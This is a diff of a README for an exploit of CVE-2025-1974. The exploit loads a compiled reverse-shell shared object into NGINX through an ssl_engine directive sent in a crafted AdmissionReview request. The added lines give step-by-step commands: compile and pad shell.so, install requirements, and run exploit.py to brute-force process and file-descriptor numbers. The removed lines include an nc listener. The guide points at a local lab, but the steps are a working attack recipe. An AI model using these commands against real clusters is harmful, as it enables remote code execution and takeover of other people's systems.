@@ -24,31 +24,27 @@ This exploit works in **two phases**:
    ```nginx
    ssl_engine /proc/<pid>/fd/<fd>;
 
- How to Use exploit.py
-The exploit.py script performs the full CVE-2025-1974 exploit by:
+   ## 🚀 Exploit Launch Guide
 
-Uploading the malicious .so file using raw sockets
+Once you've prepared the following:
 
-Sending a crafted AdmissionReview request with malicious NGINX directives
+- ✅ `shell.c` — Your C reverse shell payload  
+- ✅ `shell.so` — Compiled & padded `.so` shared object  
+- ✅ `exploit.py` — The main Python exploit script  
+- ✅ `requirements.txt` — Python dependencies
 
-Brute-forcing open file descriptors until the payload executes
+---
 
-✅ Prerequisites
-Your vulnerable lab must be running (e.g., deployed via setup.sh)
+### 📦 1. Install Requirements
 
-Ports 8080 and 8443 must be accessible locally
+```bash
+pip3 install -r requirements.txt
 
-A compiled payload named shell.so must exist in your directory
+###🧨 2. Compile & Pad Payload
+gcc -shared -fPIC -o shell.so shell.c
+python3 -c "import os; f=open('shell.so','ab'); f.write(b'\x00'*(16384 - (os.path.getsize('shell.so') % 16384))); f.close()"
 
-You can generate the payload with:
-
-~~~gcc -shared -fPIC shell.c -o shell.so
-~~~
-And keep your listener ready:
-
-~~~nc -lvnp 4444~~~
-🧾 Usage Syntax
-~~~
+###💥 3. Launch Exploit
 python3 exploit.py \
   --upload-url http://127.0.0.1:8080 \
   --admission-url https://127.0.0.1:8443 \
@@ -57,4 +53,7 @@ python3 exploit.py \
   --pid-end 40 \
   --fd-start 1 \
   --fd-end 100
-~~~
+
+
+
+
